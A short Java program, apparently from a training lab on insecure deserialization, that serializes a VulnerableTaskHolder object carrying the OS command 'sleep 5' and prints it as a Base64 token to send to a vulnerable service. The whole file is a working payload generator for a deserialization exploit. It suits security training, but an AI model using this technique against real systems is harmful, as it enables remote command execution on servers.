package org.dummy.insecure.framework;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class attack {
    public static void main(String[] args) throws Exception {
        VulnerableTaskHolder go = new VulnerableTaskHolder("My task", "sleep 5");

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(go);
        oos.flush();
        byte[] data = bos.toByteArray();

        System.out.println("Base64 token:");
        System.out.println(Base64.getEncoder().encodeToString(data));
        System.out.println("\n--- Testing deserialize ---\n");

        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            VulnerableTaskHolder restored = (VulnerableTaskHolder) ois.readObject();
            System.out.println("Deserialized object: " + restored);
        } catch (Exception e) {
            System.out.println("Exception during deserialize: " + e);
        }
    }
}
